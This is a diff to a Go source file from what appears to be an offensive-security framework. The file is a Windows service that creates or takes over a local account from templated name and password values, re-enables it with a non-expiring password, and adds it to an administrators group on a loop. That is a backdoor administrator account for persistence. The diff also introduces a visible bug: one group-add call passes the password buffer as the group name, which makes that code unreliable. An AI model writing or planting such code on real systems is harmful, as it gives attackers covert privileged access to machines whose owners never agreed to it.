@@ -1,4 +1,4 @@
-// Copyright (C) 2020 - 2023 iDigitalFlame
+// Copyright (C) 2020 - 2024 iDigitalFlame
 //
 // This program is free software: you can redistribute it and/or modify
 // it under the terms of the GNU General Public License as published by
@@ -24,12 +24,11 @@ import (
 	"time"
 	"unsafe"
 
+	"github.com/iDigitalFlame/xmt/com/limits"
 	"github.com/iDigitalFlame/xmt/device"
 	"github.com/iDigitalFlame/xmt/device/regedit"
 	"github.com/iDigitalFlame/xmt/device/winapi"
-	"github.com/iDigitalFlame/xmt/com/limits"
 	"github.com/iDigitalFlame/xmt/util"
-	"golang.org/x/sys/windows"
 )
 
 const (
@@ -38,39 +37,32 @@ const (
 )
 
 var (
-	// TODO(dij): Maybe Improve this with our library.
-	dllNetapi32 = windows.NewLazySystemDLL("netapi32.dll")
+	dllNetapi32 = winapi.NewLazyDLL("netapi32.dll")
 
-	funcNetUserAdd              = dllNetapi32.NewProc("NetUserAdd")
-	funcNetUserSetInfo          = dllNetapi32.NewProc("NetUserSetInfo")
-	funcNetLocalGroupAddMembers = dllNetapi32.NewProc("NetLocalGroupAddMembers")
+	funcNetUserAdd              = dllNetapi32.Proc("NetUserAdd")
+	funcNetUserSetInfo          = dllNetapi32.Proc("NetUserSetInfo")
+	funcNetLocalGroupAddMembers = dllNetapi32.Proc("NetLocalGroupAddMembers")
 )
 
-type userInfo2 struct {
-	Name     *uint16
-	Password *uint16
-	_        uint32
-	Priv     uint32
-	_        *uint16
-	Comment  *uint16
-	Flags    uint32
-	_        *uint16
-	_        uint32
-	FullName *uint16
-	_        *uint16
-	_        *uint16
-	_        *uint16
-	_        uint32
-	_        uint32
-	Expires  int32
-	Storage  int32
-	_        uint32
-	_        *byte
-	_        uint32
-	_        uint32
-	_        *uint16
-	_        uint32
-	_        uint32
+type userInfo struct {
+	// DO NOT REORDER
+	Name       *uint16
+	Password   *uint16
+	_, Priv    uint32
+	_, Comment *uint16
+	Flags      uint32
+	_          *uint16
+	_          uint32
+	FullName   *uint16
+	_, _, _    *uint16
+	_, _       uint32
+	Expires    int32
+	Storage    int32
+	_          uint32
+	_          *byte
+	_, _       uint32
+	_          *uint16
+	_, _       uint32
 }
 type localGroup3 struct {
 	Name *uint16
@@ -78,10 +70,10 @@ type localGroup3 struct {
 type userAddService struct {
 	last, fixup uint16
 
-	run           bool
-	admins        []uint16
-	passwd        []uint16
-	name, comment []uint16
+	enabled bool
+
+	pass, name     []uint16
+	admin, comment []uint16
 	sync.Once
 }
 
@@ -104,21 +96,21 @@ func main() {
 	}
 	device.GoExit()
 }
-func (s *userAddService) setup() {
-	s.admins, _ = winapi.UTF16FromString(`$admin`)
+func (s *userAddService) init() {
 	s.name, _ = winapi.UTF16FromString(`$fullname`)
-	s.passwd, _ = winapi.UTF16FromString(`$password`)
+	s.pass, _ = winapi.UTF16FromString(`$password`)
+	s.admin, _ = winapi.UTF16FromString(`$admin`)
 	s.comment, _ = winapi.UTF16FromString(`$comment`)
 	if len(flag) == 0 {
-		s.run = true
+		s.enabled = true
 	} else if _, err := os.Stat(flag); err == nil {
-		s.run = true
+		s.enabled = true
 	}
 }
 func (s *userAddService) exec(_ context.Context) error {
-	if s.Do(s.setup); !s.run {
+	if s.Do(s.init); !s.enabled {
 		if _, err := os.Stat(flag); err == nil {
-			s.run = true
+			s.enabled = true
 		}
 		time.Sleep(time.Second)
 		return nil
@@ -157,22 +149,22 @@ func (s *userAddService) addUser(f bool, v string) bool {
 			Storage:  -1,
 			Comment:  &s.comment[0],
 			FullName: &s.name[0],
-			Password: &s.passwd[0],
+			Password: &s.pass[0],
 		}
-		if r, _, _ := syscall.SyscallN(funcNetUserAdd.Addr(), 0, 2, uintptr(unsafe.Pointer(x)), 0); r == 0 {
+		if r, _ := funcNetUserAdd.Call(0, 2, uintptr(unsafe.Pointer(x)), 0); r == 0 {
 			g := &localGroup3{Name: n}
-			syscall.SyscallN(funcNetLocalGroupAddMembers.Addr(), 0, uintptr(unsafe.Pointer(&s.admins[0])), 3, uintptr(unsafe.Pointer(g)), 1)
+			funcNetLocalGroupAddMembers.Call(0, uintptr(unsafe.Pointer(&s.pass[0])), 3, uintptr(unsafe.Pointer(g)), 1)
 			g = nil
 		}
 		return true
 	}
 	if f {
 		if i.Flags&0x800012 != 0 || i.Flags&0x1090000 != 0x1090000 {
-			i.Password, i.Flags = &s.passwd[0], (i.Flags&^0x800012)|0x1090000
-			syscall.SyscallN(funcNetUserSetInfo.Addr(), 0, uintptr(unsafe.Pointer(n)), 2, uintptr(unsafe.Pointer(i)), 0)
+			i.Password, i.Flags = &s.pass[0], (i.Flags&^0x800012)|0x1090000
+			funcNetUserSetInfo.Call(0, uintptr(unsafe.Pointer(n)), 2, uintptr(unsafe.Pointer(i)), 0)
 		}
 		g := &localGroup3{Name: n}
-		syscall.SyscallN(funcNetLocalGroupAddMembers.Addr(), 0, uintptr(unsafe.Pointer(&s.admins[0])), 3, uintptr(unsafe.Pointer(g)), 1)
+		funcNetLocalGroupAddMembers.Call(0, uintptr(unsafe.Pointer(&s.admin[0])), 3, uintptr(unsafe.Pointer(g)), 1)
 		g = nil
 	}
 	syscall.NetApiBufferFree((*byte)(unsafe.Pointer(i)))
